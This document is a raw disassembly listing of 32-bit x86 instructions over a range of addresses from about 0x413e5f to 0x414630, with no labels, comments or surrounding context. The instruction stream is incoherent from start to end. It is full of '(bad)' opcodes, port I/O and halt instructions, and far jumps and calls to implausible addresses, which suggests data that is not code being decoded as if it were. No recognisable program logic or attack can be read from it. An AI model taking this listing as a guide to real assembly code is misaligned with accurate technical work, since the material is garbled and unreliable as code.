  413e5f:	call   0x46711c38
  413e64:	icebp  
  413e65:	and    DWORD PTR [esi-0x3b],edi
  413e68:	(bad)  [ecx]
  413e6a:	out    dx,al
  413e6b:	mov    edi,0x82056a37
  413e70:	(bad)  
  413e71:	iret   
  413e72:	add    BYTE PTR [ebx-0x17],ch
  413e75:	mov    cl,0x27
  413e77:	sbb    edx,ebp
  413e79:	add    al,0x48
  413e7b:	retf   0xffbf
  413e7e:	test   DWORD PTR [ecx+ecx*2+0x74],0xa7453d68
  413e86:	sbb    al,0x4
  413e88:	loopne 0x413e77
  413e8a:	hlt    
  413e8b:	stc    
  413e8c:	mov    ch,0x92
  413e8e:	pop    esp
  413e8f:	clc    
  413e90:	sub    BYTE PTR [eax],bh
  413e92:	jns    0x413e73
  413e94:	dec    edx
  413e95:	and    BYTE PTR [eax],al
  413e97:	dec    BYTE PTR [ebx-0x51]
  413e9a:	push   esp
  413e9b:	mov    al,0xee
  413e9d:	jns    0x413e62
  413e9f:	push   ebp
  413ea0:	(bad)  
  413ea1:	xor    eax,0xc12f6ad
  413ea6:	pop    es
  413ea7:	pop    ss
  413ea8:	mov    dl,0xd4
  413eaa:	inc    ebx
  413eab:	xor    eax,0x5fe58f2c
  413eb0:	inc    edx
  413eb1:	les    eax,FWORD PTR [eax+0x4b]
  413eb4:	pop    ds
  413eb5:	sbb    BYTE PTR [edx+0xf],ah
  413eb8:	cmp    BYTE PTR [ecx+0x2845c15d],bh
  413ebe:	fidivr WORD PTR [ebx]
  413ec0:	ret    0xb23
  413ec3:	rcr    DWORD PTR [ebp-0x69],0x6c
  413ec7:	xchg   edx,eax
  413ec8:	stos   BYTE PTR es:[edi],al
  413ec9:	inc    edx
  413eca:	(bad)  
  413ecb:	shr    BYTE PTR [edx],1
  413ecd:	sub    eax,0x7d1db1c0
  413ed2:	dec    ecx
  413ed3:	int    0x39
  413ed5:	jb     0x413f24
  413ed7:	mov    edi,DWORD PTR [edi+eax*1-0x4229be77]
  413ede:	mov    edx,0xdd790391
  413ee3:	jmp    0xf3367a34
  413ee8:	and    edx,DWORD PTR [ecx+0x37]
  413eeb:	mov    edx,0x263679c5
  413ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ef1:	sbb    eax,0x8576edac
  413ef6:	icebp  
  413ef7:	pop    ss
  413ef8:	adc    DWORD PTR [edx],edi
  413efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413efb:	sub    edi,ebx
  413efd:	out    0xd0,al
  413eff:	addr16 sub eax,0x8f3832eb
  413f05:	fbstp  TBYTE PTR [edi-0x4aff35ef]
  413f0b:	out    dx,al
  413f0c:	aas    
  413f0d:	and    BYTE PTR [edx-0x5541dad0],dl
  413f13:	sbb    eax,0x63a92043
  413f18:	pop    esp
  413f19:	mov    bh,0xbb
  413f1b:	ret    
  413f1c:	out    0x9b,al
  413f1e:	pop    ds
  413f1f:	mov    ecx,0xb75fd071
  413f24:	inc    ebp
  413f25:	sti    
  413f26:	push   0x1596c16
  413f2b:	xchg   ecx,eax
  413f2c:	or     BYTE PTR ds:0x25b6f61a,cl
  413f32:	push   edi
  413f33:	test   DWORD PTR [esi+0x50faf226],ebx
  413f39:	lahf   
  413f3a:	sub    dl,cl
  413f3c:	mov    DWORD PTR [esi-0x4d],edx
  413f3f:	std    
  413f40:	mov    ch,bl
  413f42:	mov    cl,0xe0
  413f44:	mov    ds:0x19da3d6f,eax
  413f49:	jmp    0xb588:0xdc0fec3b
  413f50:	xor    edx,DWORD PTR [ebp-0x73]
  413f53:	in     eax,0x72
  413f55:	rcl    eax,1
  413f57:	mov    bh,BYTE PTR [esi]
  413f59:	lods   eax,DWORD PTR ds:[esi]
  413f5a:	popf   
  413f5b:	retf   
  413f5c:	sbb    eax,0xabe6d92b
  413f61:	cmp    eax,DWORD PTR [edi-0x3cdb3d34]
  413f67:	div    DWORD PTR [ebx-0x2eebcce8]
  413f6d:	jge    0x413f2c
  413f6f:	fdiv   QWORD PTR [esi-0x65af2739]
  413f75:	(bad)  
  413f76:	ins    DWORD PTR es:[edi],dx
  413f77:	pop    ds
  413f78:	aam    0x60
  413f7a:	push   esi
  413f7b:	in     al,dx
  413f7c:	push   ss
  413f7d:	into   
  413f7e:	cs add ebx,DWORD PTR cs:[esp+ebp*2+0x8fc2448]
  413f87:	and    BYTE PTR [ebp+0x4cb95775],ah
  413f8d:	imul   ebx,DWORD PTR [ebp-0x29],0xffffffd7
  413f91:	sahf   
  413f92:	xchg   DWORD PTR [ecx],ecx
  413f94:	dec    ecx
  413f95:	jmp    0xc503:0xcb81a3af
  413f9c:	mov    eax,ds:0x174282d4
  413fa1:	jns    0x413f3b
  413fa3:	cmp    al,0xa5
  413fa5:	idiv   BYTE PTR [esi+0x61]
  413fa8:	mov    ebp,0x87ea1192
  413fad:	xchg   esp,eax
  413fae:	out    0xd9,eax
  413fb0:	jecxz  0x413f73
  413fb2:	mov    edi,ecx
  413fb4:	pop    es
  413fb5:	xor    esi,DWORD PTR [eax-0x6c]
  413fb8:	sbb    edx,DWORD PTR [edi]
  413fba:	inc    ebp
  413fbb:	clc    
  413fbc:	fisubr WORD PTR [ebx+0x71]
  413fbf:	mov    ds:0x63200aa6,eax
  413fc4:	or     ah,al
  413fc6:	sete   BYTE PTR [edx-0x66dff19d]
  413fcd:	fadd   QWORD PTR [eax+esi*1]
  413fd0:	adc    bh,BYTE PTR [esi]
  413fd2:	dec    ebp
  413fd3:	sub    dl,ah
  413fd5:	lea    edx,[eax-0x351fde14]
  413fdb:	xor    eax,0x995938b2
  413fe0:	ja     0x413fb8
  413fe2:	out    dx,al
  413fe3:	(bad)  
  413fe4:	scas   eax,DWORD PTR es:[edi]
  413fe5:	adc    edi,DWORD PTR [esi]
  413fe7:	jno    0x414039
  413fe9:	dec    edi
  413fea:	into   
  413feb:	mov    DWORD PTR ds:0xca912988,ecx
  413ff1:	pop    ds
  413ff2:	mov    bh,0x6f
  413ff4:	sub    al,0x73
  413ff6:	les    ecx,FWORD PTR [eax-0x2b03366e]
  413ffc:	das    
  413ffd:	ins    DWORD PTR es:[edi],dx
  413ffe:	push   cs
  413fff:	cld    
  414000:	outs   dx,BYTE PTR ds:[esi]
  414001:	aam    0xa7
  414003:	cmp    BYTE PTR [ebx+0x2b9b9d88],dh
  414009:	mov    ds:0x4ea8368b,al
  41400e:	retf   
  41400f:	adc    dh,BYTE PTR [ecx-0x1f8e5760]
  414015:	push   ebx
  414016:	fwait
  414017:	loopne 0x413f9d
  414019:	icebp  
  41401a:	aaa    
  41401b:	xchg   DWORD PTR [edi-0x3a],eax
  41401e:	cmp    DWORD PTR [ebx-0x2e],edx
  414021:	sbb    esp,esp
  414023:	push   0x83202678
  414028:	add    DWORD PTR [eax+0x6e680b57],edx
  41402e:	adc    eax,0xef83574
  414033:	test   al,0xc6
  414035:	in     eax,0xa2
  414037:	pop    esi
  414038:	push   eax
  414039:	lock mov ?,WORD PTR [ecx+0x33]
  41403d:	pop    eax
  41403e:	add    eax,0x660ba9d9
  414043:	push   0xffffffad
  414045:	pop    esi
  414046:	inc    edi
  414047:	or     bh,ah
  414049:	lds    ebx,FWORD PTR [edx]
  41404b:	mov    BYTE PTR [ecx-0x52],ah
  41404e:	xchg   ebp,eax
  41404f:	add    eax,0xd04bdd5b
  414054:	cmp    BYTE PTR [ebx+0x58105704],bh
  41405a:	loop   0x413fdf
  41405c:	dec    ebx
  41405d:	leave  
  41405e:	xchg   edi,eax
  41405f:	in     al,dx
  414060:	pop    ecx
  414061:	pop    es
  414062:	xor    eax,0xa574a241
  414067:	sbb    eax,ecx
  414069:	jl     0x414011
  41406b:	sub    BYTE PTR [ebp+0x2d4884c],al
  414071:	fidivr WORD PTR [esi]
  414073:	lds    eax,FWORD PTR [esi]
  414075:	pushf  
  414076:	or     esi,edi
  414078:	xor    eax,0x8f2fa119
  41407d:	mov    al,ds:0xe5fffa10
  414082:	into   
  414083:	or     al,0xcf
  414085:	xchg   ecx,esi
  414087:	push   ss
  414088:	cmp    ch,BYTE PTR [edx+esi*1+0x9]
  41408c:	push   esp
  41408d:	ja     0x41410b
  41408f:	xchg   ebp,eax
  414090:	mov    fs,WORD PTR [edi-0x61de6ecd]
  414096:	lea    ebp,[esi-0x54bc4f37]
  41409c:	jmp    0x1032:0xb75b0e2f
  4140a3:	inc    edi
  4140a4:	loope  0x4140e6
  4140a6:	sbb    dh,BYTE PTR [ecx]
  4140a8:	dec    ecx
  4140a9:	mov    BYTE PTR [eax+0x7e670b4b],al
  4140af:	mov    ecx,DWORD PTR [eax+0x59cfaba1]
  4140b5:	add    DWORD PTR [esi-0x3c],esp
  4140b8:	push   0xfffffff7
  4140ba:	in     al,dx
  4140bb:	fsub   st(2),st
  4140bd:	mov    BYTE PTR [esi-0x63],cl
  4140c0:	dec    esi
  4140c1:	fldenv [edi-0x27]
  4140c4:	mov    eax,0x3dd1a932
  4140c9:	and    al,0xb2
  4140cb:	xchg   BYTE PTR [ecx-0x3da4d11e],al
  4140d1:	out    0xfd,eax
  4140d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140d4:	ins    DWORD PTR es:[edi],dx
  4140d5:	hlt    
  4140d6:	inc    edi
  4140d7:	int3   
  4140d8:	xor    esp,DWORD PTR [esi-0x7cb5415a]
  4140de:	lds    edx,FWORD PTR [eax+0x646a3a53]
  4140e4:	pusha  
  4140e5:	ja     0x41410b
  4140e7:	(bad)
  4140ea:	pop    ecx
  4140eb:	in     eax,dx
  4140ec:	leave  
  4140ed:	out    0x92,eax
  4140ef:	xchg   ebx,eax
  4140f0:	aad    0xec
  4140f2:	in     eax,0xa2
  4140f4:	push   edi
  4140f5:	(bad)  
  4140f6:	mov    ds:0x773d26c2,eax
  4140fb:	je     0x414096
  4140fd:	jnp    0x4140bd
  4140ff:	mov    cl,0x6a
  414101:	jo     0x414086
  414103:	and    edi,DWORD PTR [ebx+0x55]
  414106:	push   cs
  414107:	push   esp
  414108:	addr16 test eax,ebx
  41410b:	mov    dh,0x15
  41410d:	retf   0x706
  414110:	fwait
  414111:	sub    DWORD PTR [ebp-0x3a326ea1],esp
  414117:	retf   0xe9e
  41411a:	scas   eax,DWORD PTR es:[edi]
  41411b:	mov    edx,0x976c29cc
  414120:	mov    DWORD PTR [esi],esp
  414122:	sbb    bh,0x21
  414125:	std    
  414126:	test   DWORD PTR ds:0x58420c5e,edx
  41412c:	pop    edi
  41412d:	xchg   ecx,eax
  41412e:	kaddb  k0,k5,k2
  414132:	push   edx
  414133:	mov    bh,0x97
  414135:	imul   edi,DWORD PTR [ebx-0x449ba250],0xb
  41413c:	jmp    0x977b64e7
  414141:	js     0x4140dc
  414143:	arpl   WORD PTR [edi+esi*8-0x77d32b43],dx
  41414a:	push   ebx
  41414b:	cmc    
  41414c:	mov    al,0xd8
  41414e:	and    BYTE PTR [ebx],ch
  414150:	stos   WORD PTR es:[edi],ax
  414152:	adc    cl,BYTE PTR [esi+0x2ff56d6f]
  414158:	scas   al,BYTE PTR es:[edi]
  414159:	mov    ecx,0x1f92e321
  41415e:	pusha  
  41415f:	cwde   
  414160:	sub    eax,0xf0bcf7c
  414165:	inc    ebx
  414166:	aaa    
  414167:	add    DWORD PTR [ebx-0x28],0x44a5d8ca
  41416e:	dec    edi
  41416f:	jmp    DWORD PTR [edi+0x1d]
  414172:	push   ecx
  414173:	sub    ebp,ebx
  414175:	push   ebx
  414176:	push   cs
  414177:	inc    esp
  414178:	(bad)  
  414179:	lods   al,BYTE PTR ds:[esi]
  41417a:	imul   eax,DWORD PTR [edi-0xa],0xc9446149
  414181:	and    DWORD PTR [edx-0x5f],edi
  414184:	ins    DWORD PTR es:[edi],dx
  414185:	jo     0x4141bf
  414187:	and    al,dh
  414189:	and    eax,0xd2ab366a
  41418e:	xchg   esi,eax
  41418f:	loop   0x414114
  414191:	fmul   st,st(0)
  414193:	cs mov cl,0x77
  414196:	loop   0x414163
  414198:	mov    edx,0xe671d984
  41419d:	xchg   ebx,eax
  41419e:	adc    al,0xb4
  4141a0:	cld    
  4141a1:	jl     0x4141ba
  4141a3:	mov    dl,0xd7
  4141a5:	test   DWORD PTR [edx],ecx
  4141a7:	and    al,0xd7
  4141a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141aa:	aaa    
  4141ab:	test   eax,0x45b83f49
  4141b0:	mov    BYTE PTR [edi-0x59e65924],ah
  4141b6:	push   edi
  4141b7:	jmp    0x4141f4
  4141b9:	pop    esp
  4141ba:	mov    eax,ds:0x3e92ba96
  4141bf:	test   eax,0x38b62bb6
  4141c4:	pop    ebp
  4141c5:	fiadd  WORD PTR [edx-0x59]
  4141c8:	and    al,0x6
  4141ca:	shl    BYTE PTR ds:0x3f8e0069,0xd0
  4141d1:	ror    ebp,0xcf
  4141d4:	mov    ds:0x3c3082ac,al
  4141d9:	out    0x8,eax
  4141db:	cmp    DWORD PTR [bp-0xb],esi
  4141df:	xchg   ecx,eax
  4141e0:	(bad)  
  4141e1:	adc    ebx,DWORD PTR ds:[esi+0x1b267bcc]
  4141e8:	sub    al,0x2c
  4141ea:	fnstenv [ebp+0x9]
  4141ed:	mov    ch,0x3a
  4141ef:	and    DWORD PTR [esi],esp
  4141f1:	je     0x414249
  4141f3:	push   esp
  4141f4:	push   0x3a9b6c7
  4141f9:	add    bh,ah
  4141fb:	loop   0x41420b
  4141fd:	lea    eax,[eax+0x79]
  414200:	push   edi
  414201:	scas   al,BYTE PTR es:[edi]
  414202:	push   ebx
  414203:	cld    
  414204:	rcl    esp,0x47
  414207:	mov    ebp,0x37eb8c66
  41420c:	xchg   esp,eax
  41420d:	rcl    DWORD PTR [ebx+0x1d],0x80
  414211:	out    dx,eax
  414212:	test   DWORD PTR [ecx+0x77],ebp
  414215:	out    dx,eax
  414216:	mov    ebp,0x18e11d3
  41421b:	addr16 hlt 
  41421d:	xor    BYTE PTR [esi-0x1ed34074],0x1a
  414224:	pop    ecx
  414225:	test   DWORD PTR [ebx-0x6a],ebx
  414228:	aas    
  414229:	in     eax,0xc2
  41422b:	scas   al,BYTE PTR es:[edi]
  41422c:	popf   
  41422d:	leave  
  41422e:	mov    ebx,0xfd5e943f
  414233:	jae    0x4142b1
  414235:	push   esp
  414236:	xchg   BYTE PTR [edi],bl
  414238:	fsub   QWORD PTR [edi+0x1f]
  41423b:	ficomp DWORD PTR [esi-0x44]
  41423e:	xor    al,BYTE PTR [ebx-0x383c5fbc]
  414244:	or     DWORD PTR [edx],ebp
  414246:	xchg   esi,eax
  414247:	scas   eax,DWORD PTR es:[edi]
  414248:	div    cl
  41424a:	inc    ecx
  41424b:	cmp    ah,BYTE PTR [esi+0x524b1bfd]
  414251:	add    al,0xf8
  414253:	mov    al,ds:0x42d10363
  414258:	adc    esi,DWORD PTR [ebp+0x3b]
  41425b:	cmp    BYTE PTR [eax-0x54c72cd1],al
  414261:	fst    QWORD PTR [eax+0x3d6bf4ba]
  414267:	jae    0x4142cb
  414269:	in     eax,dx
  41426a:	jnp    0x4142b8
  41426c:	dec    esp
  41426d:	cwde   
  41426e:	jb     0x41421b
  414270:	jmp    0xefcd94f7
  414275:	push   cs
  414276:	outs   dx,DWORD PTR ds:[esi]
  414277:	or     eax,0xf8bcde25
  41427c:	or     ch,BYTE PTR [ecx+ecx*8]
  41427f:	inc    ecx
  414280:	mov    al,0x74
  414282:	jle    0x4142af
  414284:	shr    dl,1
  414286:	xor    ecx,DWORD PTR [ebx-0x1797e44d]
  41428c:	test   dh,ch
  41428e:	inc    ebp
  41428f:	ret    0xb3f
  414292:	in     eax,0xf6
  414294:	cs mov dl,0xa
  414297:	call   edi
  414299:	test   al,0x77
  41429b:	push   cs
  41429c:	loop   0x414281
  41429e:	pop    edi
  41429f:	imul   bh
  4142a1:	and    BYTE PTR [esi+edi*8],dh
  4142a4:	xchg   esp,eax
  4142a5:	clc    
  4142a6:	push   ebx
  4142a7:	push   ebp
  4142a8:	shl    BYTE PTR [edx+0x4c],0x82
  4142ac:	ror    BYTE PTR [edi+0x7c83a684],cl
  4142b2:	es pushf 
  4142b4:	jns    0x414236
  4142b6:	loopne 0x4142e9
  4142b8:	pop    ss
  4142b9:	push   ss
  4142ba:	not    DWORD PTR [ecx]
  4142bc:	or     cl,BYTE PTR [esi+0x5a7c05f7]
  4142c2:	lods   eax,DWORD PTR ds:[esi]
  4142c3:	jnp    0x414247
  4142c5:	adc    eax,0x9006c0fe
  4142ca:	pop    ss
  4142cb:	xchg   BYTE PTR [edx-0x18ead0c1],dh
  4142d1:	outs   dx,DWORD PTR cs:[esi]
  4142d3:	pop    edx
  4142d4:	xchg   DWORD PTR [ebx],edi
  4142d6:	sbb    ah,dh
  4142d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142d9:	or     BYTE PTR [edx+0x12],0xf7
  4142dd:	push   ebx
  4142de:	(bad)  
  4142df:	aas    
  4142e0:	adc    dh,BYTE PTR ds:0x57cf3b00
  4142e6:	jo     0x4142f4
  4142e8:	jb     0x41426a
  4142ea:	xchg   edi,eax
  4142eb:	popf   
  4142ec:	ds inc edx
  4142ee:	aam    0xd
  4142f0:	xchg   ebx,eax
  4142f1:	xchg   esi,eax
  4142f2:	in     al,0x24
  4142f4:	ja     0x4142ff
  4142f6:	(bad)  
  4142f7:	adc    al,0xeb
  4142f9:	jge    0x4142f4
  4142fb:	popa   
  4142fc:	jbe    0x414313
  4142fe:	pop    ecx
  4142ff:	pop    ebp
  414300:	das    
  414301:	sbb    DWORD PTR [edi],esi
  414303:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  414305:	mov    edx,esi
  414307:	xchg   ebx,ebx
  414309:	mov    ecx,DWORD PTR [eax]
  41430b:	in     al,dx
  41430c:	dec    edi
  41430d:	ins    BYTE PTR es:[edi],dx
  41430e:	aas    
  41430f:	jne    0x41438c
  414311:	xor    ah,bh
  414313:	sub    al,0x1b
  414315:	mov    cl,0xf5
  414317:	jnp    0x414365
  414319:	hlt    
  41431a:	or     BYTE PTR [edi+0x7c],bh
  41431d:	ja     0x414353
  41431f:	lahf   
  414320:	dec    ebx
  414321:	and    DWORD PTR [ecx+0x10],ebx
  414324:	xor    al,al
  414326:	jo     0x41432e
  414328:	mov    ch,bh
  41432a:	int    0x58
  41432c:	mov    al,ds:0xc36991b1
  414331:	hlt    
  414332:	dec    eax
  414333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414334:	and    al,0x15
  414336:	inc    ebx
  414337:	cmp    esp,DWORD PTR [eax+0x440fec8c]
  41433d:	(bad)  
  41433e:	sbb    eax,0x73ac8129
  414343:	repnz cmc 
  414345:	in     eax,0x86
  414347:	mov    ch,0xd2
  414349:	rcl    BYTE PTR ds:0x5a54450e,cl
  41434f:	mov    esp,0xecdee33a
  414354:	sbb    DWORD PTR [edx],0xffffff81
  414357:	or     dl,bh
  414359:	add    ebx,DWORD PTR [ecx-0x57aeb631]
  41435f:	inc    ecx
  414360:	out    0x9a,eax
  414362:	stos   BYTE PTR es:[edi],al
  414363:	jecxz  0x414310
  414365:	(bad)  
  414366:	pop    ebp
  414367:	inc    esp
  414368:	scas   eax,DWORD PTR es:[edi]
  414369:	and    BYTE PTR [esi+0x351c7db5],al
  41436f:	adc    al,BYTE PTR [eax-0x1022be0b]
  414375:	push   esi
  414376:	(bad)  
  414378:	lea    eax,[esi+edi*8+0x71f15688]
  41437f:	int3   
  414380:	sbb    cl,dl
  414382:	dec    esp
  414383:	pop    esi
  414384:	bnd ret 
  414386:	mov    WORD PTR [esi],fs
  414388:	and    dh,ch
  41438a:	dec    edx
  41438b:	lods   eax,DWORD PTR ds:[esi]
  41438c:	mov    DWORD PTR [esi-0x30bf3f22],ebx
  414392:	xchg   esi,eax
  414393:	js     0x4143f8
  414395:	jae    0x8527e057
  41439b:	jge    0x41433a
  41439d:	ror    DWORD PTR [ebp-0x34d4f7eb],0xb0
  4143a4:	mov    dl,0x21
  4143a6:	test   cl,dl
  4143a8:	scas   eax,DWORD PTR es:[edi]
  4143a9:	addr16 js 0x4143df
  4143ac:	jnp    0x41433d
  4143ae:	bound  edi,QWORD PTR gs:[ebx-0x66]
  4143b2:	(bad)  [esi+edi*2-0x4c]
  4143b6:	sti    
  4143b7:	fst    DWORD PTR [ecx+ebx*1]
  4143ba:	jbe    0x414439
  4143bc:	jmp    0x5716bf7a
  4143c1:	dec    edi
  4143c2:	mov    dl,dh
  4143c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143c5:	cmp    edx,DWORD PTR [edx]
  4143c7:	xor    cl,BYTE PTR [edx+edx*8]
  4143ca:	scas   eax,DWORD PTR es:[edi]
  4143cb:	div    ebx
  4143cd:	ss push edi
  4143cf:	add    eax,0xa9800204
  4143d4:	mov    bl,0xb3
  4143d6:	mov    ebp,0x77129e8d
  4143db:	shl    DWORD PTR [eax+0x2e],cl
  4143de:	out    0x72,al
  4143e0:	sbb    BYTE PTR [edi],dl
  4143e2:	(bad)  
  4143e3:	jmp    0xa6e7:0xac754e0d
  4143ea:	scas   al,BYTE PTR es:[edi]
  4143eb:	loop   0x4143df
  4143ed:	test   al,0xff
  4143ef:	in     eax,dx
  4143f0:	jl     0x4143a1
  4143f2:	int3   
  4143f3:	cmp    DWORD PTR fs:[edi-0x484205b8],ebx
  4143fa:	or     BYTE PTR [edx-0xc6dc0c6],0x20
  414401:	add    edx,DWORD PTR [eax]
  414403:	sub    DWORD PTR [eax],0x5d
  414406:	jo     0x4143cc
  414408:	jmp    0x414422
  41440a:	push   ds
  41440b:	xor    al,0x7d
  41440d:	cdq    
  41440e:	or     eax,eax
  414410:	xor    eax,0xed50d170
  414415:	or     esi,edx
  414417:	rcr    BYTE PTR [eax],1
  414419:	pop    ebp
  41441a:	or     al,0x5b
  41441c:	inc    ebx
  41441d:	mov    bl,0x97
  41441f:	in     eax,0xcf
  414421:	mov    edx,0x39ba6886
  414426:	xor    cl,BYTE PTR [eax]
  414428:	mov    ebp,0xe7440c9e
  41442d:	test   bl,bl
  41442f:	in     al,0x68
  414431:	jo     0x4144a1
  414433:	loopne 0x4144b3
  414435:	clc    
  414436:	or     ch,BYTE PTR [edx+0x30]
  414439:	jle    0x4143da
  41443b:	pop    ebp
  41443c:	ret    
  41443d:	mov    edi,0xde3d3a0d
  414442:	jmp    0xbd5d:0x7fbc2abb
  414449:	or     BYTE PTR [eax],bh
  41444b:	cmp    bx,WORD PTR [ecx-0x36]
  41444f:	imul   ecx,DWORD PTR [ebp+0xcc4279a],0xffffff99
  414456:	and    eax,0xa4182476
  41445b:	cmp    eax,0xa52b343e
  414460:	and    edi,edi
  414462:	jmp    0xe19e:0x7b4d7944
  414469:	addr16 das 
  41446b:	ret    
  41446c:	jne    0x4144b9
  41446e:	clc    
  41446f:	sti    
  414470:	xchg   edx,eax
  414471:	pop    ss
  414472:	and    BYTE PTR ds:[ebp-0x2e],cl
  414476:	(bad)  
  414477:	jmp    0x4144bf
  414479:	in     eax,0x21
  41447b:	scas   eax,DWORD PTR es:[edi]
  41447c:	std    
  41447d:	or     BYTE PTR [ecx+0x34cced61],al
  414483:	xor    eax,0x26b09ad6
  414488:	jno    0x414420
  41448a:	cld    
  41448b:	inc    DWORD PTR [edi]
  41448d:	addr16 add al,0xe2
  414490:	push   ebx
  414491:	inc    ebx
  414492:	push   ss
  414493:	retf   
  414494:	jbe    0x4144ab
  414496:	cmc    
  414497:	shl    BYTE PTR [edx-0x43c5c7ed],1
  41449d:	fcmovb st,st(4)
  41449f:	call   0x6105:0xb67bd576
  4144a6:	aam    0x33
  4144a8:	inc    ebp
  4144a9:	mov    bl,0x6d
  4144ab:	mov    edx,0x3e0cb6f6
  4144b0:	jecxz  0x414441
  4144b2:	and    dh,BYTE PTR [ebx]
  4144b4:	sti    
  4144b5:	mov    bl,0x5b
  4144b7:	rol    DWORD PTR [ebp+0x77],1
  4144ba:	aad    0x1b
  4144bc:	cs nop
  4144be:	push   ebx
  4144bf:	fisubr DWORD PTR [esi-0x51]
  4144c2:	(bad)  
  4144c3:	cmp    cl,BYTE PTR [ebx-0x23]
  4144c6:	(bad)  
  4144c7:	hlt    
  4144c8:	retf   0x3acc
  4144cb:	xchg   edi,eax
  4144cc:	sbb    eax,0x3090bc3f
  4144d1:	xor    DWORD PTR [edi],ebx
  4144d3:	aas    
  4144d4:	xchg   edx,eax
  4144d5:	repz adc eax,0xe3f30fe6
  4144db:	mov    dh,0x33
  4144dd:	push   ss
  4144de:	add    esi,DWORD PTR [eax]
  4144e0:	xor    eax,DWORD PTR [esi]
  4144e2:	out    dx,eax
  4144e3:	push   eax
  4144e4:	scas   eax,DWORD PTR es:[edi]
  4144e5:	ins    DWORD PTR es:[edi],dx
  4144e6:	(bad)  
  4144e7:	in     eax,0xe0
  4144e9:	dec    edi
  4144ea:	rcr    DWORD PTR [ebx+0x1b8d28d],0x4c
  4144f1:	xchg   edx,eax
  4144f2:	xor    al,0xc0
  4144f4:	pop    edi
  4144f5:	sbb    al,0xed
  4144f7:	adc    al,0x4d
  4144f9:	nop
  4144fa:	jmp    0xc8dd:0x55fa0c0
  414501:	sbb    ch,BYTE PTR [edi+0x24854c9f]
  414507:	adc    al,0x8b
  414509:	out    0x63,eax
  41450b:	(bad)  
  41450c:	outs   dx,BYTE PTR ds:[esi]
  41450d:	inc    ebp
  41450e:	xor    DWORD PTR [eax+0x44],ebp
  414511:	sahf   
  414512:	bnd jp 0x41458e
  414515:	outs   dx,DWORD PTR ds:[esi]
  414516:	enter  0x67aa,0x54
  41451a:	xchg   bl,ch
  41451c:	stc    
  41451d:	xchg   dh,dh
  41451f:	addr16 in eax,0x64
  414522:	jns    0x414559
  414524:	jmp    0x7489840e
  414529:	and    esp,DWORD PTR [ecx-0x98602fa]
  41452f:	mov    eax,ds:0x7c5d45d9
  414534:	mov    esi,0x4fffe185
  414539:	(bad)  
  41453a:	mov    ah,0xbd
  41453c:	sbb    al,0xc6
  41453e:	pop    edi
  41453f:	mov    ah,0x75
  414541:	nop
  414542:	sub    ah,BYTE PTR [edi]
  414544:	pushf  
  414545:	jb     0x414546
  414547:	scas   al,BYTE PTR es:[edi]
  414548:	je     0x4144e5
  41454a:	cmp    BYTE PTR [edi+edi*8],cl
  41454d:	dec    edx
  41454e:	test   eax,0x3ff54041
  414553:	and    al,BYTE PTR [esi+0x41]
  414556:	les    eax,FWORD PTR [esp+ebx*1]
  414559:	cmc    
  41455a:	or     DWORD PTR [eax+0x37043b7a],esi
  414560:	outs   dx,DWORD PTR ds:[esi]
  414561:	mov    edx,0xbc3c08c
  414566:	jl     0x4145b9
  414568:	mov    ss,WORD PTR [ebp+esi*8-0x3b]
  41456c:	push   eax
  41456d:	adc    dh,ah
  41456f:	mov    gs,ebx
  414571:	jno    0x414580
  414573:	add    DWORD PTR [ecx+edx*2-0x17e12ca7],0x62f7d8bf
  41457e:	(bad)  
  41457f:	mov    ecx,0x55994dc0
  414584:	jmp    0x9c90:0xe4652faf
  41458b:	enter  0xc14d,0xe0
  41458f:	sti    
  414590:	xchg   edi,eax
  414591:	scas   eax,DWORD PTR es:[edi]
  414592:	add    esi,ecx
  414594:	xor    eax,0x7432b935
  414599:	cmc    
  41459a:	cld    
  41459b:	addr16 dec edi
  41459d:	sub    DWORD PTR [eax-0x7e],edx
  4145a0:	push   ecx
  4145a1:	ds inc ecx
  4145a3:	pop    esp
  4145a4:	sahf   
  4145a5:	push   cs
  4145a6:	add    ch,bh
  4145a8:	fidivr DWORD PTR [edx+0x2]
  4145ab:	test   al,0x91
  4145ad:	push   esi
  4145ae:	dec    ecx
  4145af:	adc    al,0xc6
  4145b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145b2:	adc    DWORD PTR [ebp-0x3c],edi
  4145b5:	mov    al,bl
  4145b7:	jb     0x414555
  4145b9:	imul   DWORD PTR [esp+edi*4]
  4145bc:	adc    DWORD PTR [ebx],ebp
  4145be:	sbb    BYTE PTR fs:[ebp+0x7f],0x67
  4145c3:	push   esp
  4145c4:	and    eax,0x620c619f
  4145c9:	lahf   
  4145ca:	cmp    eax,0xb704fb0c
  4145cf:	dec    ebp
  4145d0:	clc    
  4145d1:	(bad)  
  4145d2:	pop    esp
  4145d3:	add    ah,BYTE PTR [edx]
  4145d5:	leave  
  4145d6:	retf   
  4145d7:	in     al,0x32
  4145d9:	pop    ecx
  4145da:	enter  0xc559,0x86
  4145de:	aaa    
  4145df:	inc    esp
  4145e0:	and    ecx,DWORD PTR [edx+edi*1+0x3e]
  4145e4:	ret    
  4145e5:	sbb    eax,0x4bdc58d2
  4145ea:	bound  esp,QWORD PTR [edx]
  4145ec:	xor    dl,dl
  4145ee:	popa   
  4145ef:	dec    esi
  4145f0:	dec    edi
  4145f1:	mov    esi,0x487a75c8
  4145f6:	jp     0x4145b2
  4145f8:	sub    BYTE PTR [eax+0x10181ebf],bh
  4145fe:	xchg   ebp,eax
  4145ff:	inc    ebx
  414600:	pop    edi
  414601:	adc    al,0x6a
  414603:	and    DWORD PTR [ebp+eax*2-0x2],ebx
  414607:	sbb    edx,DWORD PTR [edx]
  414609:	dec    ebp
  41460a:	pop    esp
  41460b:	popa   
  41460c:	inc    ebp
  41460d:	jmp    0xebaf637
  414612:	sub    BYTE PTR [eax+eiz*1-0x43],0xad
  414617:	xor    DWORD PTR [ebx],eax
  414619:	leave  
  41461a:	xor    BYTE PTR [eax+edi*8-0x25917a73],ah
  414621:	inc    edi
  414622:	ret    
  414623:	in     eax,dx
  414624:	mov    ebx,0xe32c6533
  414629:	bound  esi,QWORD PTR cs:[ebp-0x455d318e]
  414630:	cld    
